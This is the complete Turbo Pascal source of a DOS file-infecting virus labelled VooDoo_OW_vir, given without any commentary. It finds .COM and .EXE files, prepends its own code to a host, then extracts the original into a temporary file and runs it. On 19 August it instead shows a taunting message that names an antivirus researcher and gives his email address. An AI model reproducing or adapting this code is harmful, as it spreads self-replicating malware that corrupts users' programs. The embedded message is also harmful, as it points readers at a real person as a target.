program VooDoo_OW_vir;

uses dos;

CONST VIRSIZE = 4745;

var s     : searchrec;
    fname : string;
    buf   : array[1..VIRSIZE] of byte;
    buf2  : array[1..VIRSIZE] of byte;
    f     : file;
    y, m, d, dow : word;
    p     : pointer;
    l     : longint;

procedure Infect(s : string);

begin
   GetMem(p, 65535);
   assign(f, paramstr(0));
   reset(F, 1);
   blockread(f, buf, VIRSIZE);
   close(f);
   assign(f, s);
   reset(f, 1);
   l := filesize(f);
   blockread(f, p^, l);
   seek(f, 0);
   blockwrite(f, buf, virsize);
   blockwrite(f, p^, l);
   close(f);
   Freemem(p, 65535);
end;

function Searchfile : string;

var foundit : boolean;
    w : word;

begin
   foundit := FALSE;
   FindFirst('*.com', archive, s);
   repeat
      FindNext(s);
      if s.name <> 'COMMAND.COM' then begin
      assign(f, s.name);
      reset(f, 1);
      blockread(f, buf, 3);
      if (buf[1] <> byte('M')) and (buf[2] <> byte('Z'))
      and (filesize(f)>2048) and (filesize(f)<32768) then foundit := TRUE;
      close(f);
      end;
   until (doserror <> 0) or (foundit = TRUE);
   if foundit = false then begin
      findfirst('*.exe', archive, s);
      repeat
         findnext(s);
         assign(f, s.name);
         reset(f, 1);
         blockread(f, buf, 3);
         close(f);
         if buf[3] <> $89 then foundit := TRUE;
      until (doserror <> 0) or (foundit = TRUE);
   end;
   if foundit = true then Searchfile := s.name else Searchfile := '';
end;

begin
   GetDate(y, m, d, dow);
   if (m = 8) and (d=19) then begin
      writeln;
      writeln('Do ya know it''s Vesselin Bontchev''s birthday 2day?');
      writeln('He studies how 2 kill virii like this 1..');
      writeln('Yar probably happy that there r people like him.. so..');
      writeln('why not write him a birthday message.. the adress is :');
      writeln;
      writeln('BONTCHEV@BIHH.INFORMATIK.UNI-HAMBURG.DE...');
      writeln;
      writeln('Just remember 2 say we put ya up 2 it... :-)');
      writeln;
      writeln;
      writeln('Bontchev''s Birthday (c) [VooDoo]-');
      writeln;
      halt;
   end else begin
      fname := Searchfile;
{      fname := 'c:\saddam\mode.com';}
      if fname <> '' then
      Infect(fname);
      GetMem(p, 65535);
      assign(f,  paramstr(0));
      reset(f, 1);
      l := filesize(f);
      blockread(f, buf, virsize);
      blockread(f, p^, l-virsize);
      close(f);
      assign(f, 'temp.com');
      rewrite(f, 1);
      blockwrite(f, p^, l-virsize);
      close(F);
      FreeMem(p, 65535);
      exec('temp.com', paramstr(1)+' '+paramstr(2)+' '+paramstr(3));
      assign(f, 'temp.com');
      erase(f);
      close(f);
   end;
end.
